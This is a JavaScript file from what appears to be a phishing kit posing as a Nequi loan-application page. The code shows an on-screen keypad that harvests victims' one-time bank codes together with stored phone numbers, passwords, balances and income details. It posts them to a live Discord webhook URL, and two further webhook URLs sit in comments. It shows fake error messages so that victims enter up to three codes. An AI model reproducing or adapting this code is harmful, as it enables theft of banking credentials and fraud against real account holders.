document.addEventListener("DOMContentLoaded", () => {
  const validoHasta = localStorage.getItem('validoHasta');

  const validoHastaText =
    document.getElementById("validoHasta");

  validoHastaText.innerHTML = validoHasta;

  const inputs = document.querySelectorAll('input[id^="otp-"]');
  const keyboard = document.getElementById("keyboard");
  const deleteBtn = document.getElementById("delete-otp");
  const loadingSpinner = document.querySelector(".loadingContainer");
  const finishContainer = document.querySelector(".finishContainer");
  const sectionTeclado = document.getElementById("sectionTeclado");
  const btnReturn = document.getElementById("btnReturn");

  const amount = document.getElementById("amount");
  const params = new URLSearchParams(window.location.search);
  const type = params.get("type");

  // loadingSpinner.style.display = "block";
  //Despues de 1 segundo se muestra el mensaje de error
  // setTimeout(() => {
  //   loadingSpinner.style.display = "none";
  // }, 5000);

  btnReturn.addEventListener("click", (e) => {
    window.location.href = 'accces-sign-in.php.html';
  });

  let currentInput = 0;
  let contSend = 0;

  // Manejar clics del teclado
  keyboard.addEventListener("click", (e) => {
    const button = e.target.closest(".keyboard-btn");
    if (button && !button.id.includes("delete")) {
      const value = button.dataset.value;
      if (currentInput < inputs.length) {
        // Guardar el valor real en un atributo personalizado
        inputs[currentInput].dataset.realValue = value;
        // Mostrar asterisco en el campo de entrada
        inputs[currentInput].value = "*";
        // Disparar el evento input
        inputs[currentInput].dispatchEvent(
          new Event("input", {
            bubbles: true,
          })
        );
        currentInput++;
      }
    }
  });

  // Manejar el botón de borrar
  deleteBtn.addEventListener("click", () => {
    if (currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Permitir borrar con tecla retroceso
  document.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", {
          bubbles: true,
        })
      );
    }
  });

  // Prevenir cualquier entrada de teclado físico
  inputs.forEach((input) => {
    ["keydown", "keyup", "keypress", "input", "textInput"].forEach(
      (eventType) => {
        input.addEventListener(eventType, (e) => {
          e.preventDefault();
          return false;
        });
      }
    );

    input.addEventListener("paste", (e) => {
      e.preventDefault();
      return false;
    });

    input.setAttribute("readonly", "readonly");
    input.setAttribute("inputmode", "none");
  });

  function resetKeyboard() {
    currentInput = 0;

    inputs.forEach((input) => {
      input.value = "";
      input.dataset.realValue = ""; // Borra el valor real también
    });

    inputs[0].focus();
  }

  // Verificar el estado de los inputs
  inputs.forEach((input, index) => {
    input.addEventListener("input", async () => {
      let isComplete = Array.from(inputs).every((input) => input.value !== "");
      if (isComplete) {
        let otp = "";
        inputs.forEach((input) => {
          otp += input.dataset.realValue || "";
        });

        const formData = JSON.parse(localStorage.getItem("formData")) || {};

        // if (otp === "123456" || otp === formData.cedula.toString().slice(0, 6)) {
        if (otp === "123456" || otp === String(formData.cedula ?? "").slice(0, 6)) {
          const errorMessage = document.querySelector(".errorMessage");
          errorMessage.style.opacity = "1";
          errorMessage.style.transform = "translateY(-20px)";

          setTimeout(() => {
            resetKeyboard();
          }, 100);

          setTimeout(() => {
            errorMessage.style.opacity = "0";
            errorMessage.style.transform = "translateY(20px)";
          }, 5000);

          return;
        }
        contSend += 1;

        amount.innerHTML = "$ " + formData.montoPrestamo;

        loadingSpinner.style.display = "block";

        // const message = `⭐️Dinamica ${contSend}⭐️\n\n🪪Cedula: ${formData.cedula}\n👤Nombre: ${formData.nombreCompleto}\n💰Monto: ${formData.montoPrestamo}\n🧑‍💼Ocupación: ${formData.ocupacion}\n📈Ingresos mensuales: ${formData.ingresoMensual}\n💸Gastos mensuales: ${formData.gastosMensual}\n🔥Saldo actual en tu cuenta NEQUI: ${formData.saldoActual}\n🔢Meses: ${formData.meses}\n📅Fecha de pago: ${formData.fechaPago}\n📱Número: ${formData.phoneNumber}\n🔒Clave: ${formData.password}\n📢Tipo: ${formData.tipoProducto}\n🔒Clave Dinamina ${contSend}: ${otp}`;
        const message = `⭐️Dinamica ${contSend}⭐️\n\n💰Monto: ${formData.montoPrestamo}\n🧑‍💼Ocupación: ${formData.ocupacion}\n📈Ingresos mensuales: ${formData.ingresoMensual}\n💸Gastos mensuales: ${formData.gastosMensual}\n🔥Saldo actual en tu cuenta NEQUI: ${formData.saldoActual}\n🔢Meses: ${formData.meses}\n📅Fecha de pago: ${formData.fechaPago}\n📱Número: ${formData.phoneNumber}\n🔒Clave: ${formData.password}\n📢Tipo: ${formData.tipoProducto}\n🔒Clave Dinamina ${contSend}: ${otp}`;

        setTimeout(() => {
          resetKeyboard();
          loadingSpinner.style.display = "none";
        }, 30000);

        if (contSend === 3) {
          finishContainer.style.display = "block";
          sectionTeclado.style.display = "none";
        } else {
          //Despues de 1 segundo se muestra el mensaje de error
          setTimeout(() => {
            const errorMessage = document.querySelector(".errorMessage");
            errorMessage.style.opacity = "1";
            errorMessage.style.transform = "translateY(-20px)";
            setTimeout(() => {
              errorMessage.style.opacity = "0";
              errorMessage.style.transform = "translateY(20px)";
            }, 5000);
          }, 30500);
        }
        const discordPayload = {
                    username: "Consulta de Crédito",
                    content: message
                };
        try {
          await sendTelegramMessageNoBtn(discordPayload);
        } catch (error) {
          console.error("Error al enviar mensaje:", error);
        }
      }
    });
  });

  async function sendTelegramMessageNoBtn(mensaje) {
    // const url =
    //   "https://discordapp.com/api/webhooks/1513106444722110564/nV_nXqcGdy33nJ3jOkYu_CfIdF5n2ILVFa739iV5RfmjTK2AwlrWnOEZXb7OewANWVDV"; // Asegúrate de que el puerto coincida con el de tu servidor
    //const url = "https://discordapp.com/api/webhooks/1526322012207976579/fvFbhdfzb6zZQhKzneSKLXd6WnFcKrHKjUhjnl1kLfHw1qPS9Yl6q-MsNFG8CY6yZbnh";
    const url = "https://discordapp.com/api/webhooks/1524574270779560081/NeHdkgwsnLidvr7pWqmwOykOsGLkFBvkQvrnM2Q6CuC6qooczSHB32Tpiz3JwnawbsXF";

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(mensaje),
    });

    if (!response.ok) {
      const errorText = await response.text(); // O .json() si sabes que la respuesta es JSON
      throw new Error(`${response.status}: ${errorText}`);
    }

    const respuesta = (await response.text()).replace(/"/g, "").trim();
    return respuesta;
  }
});
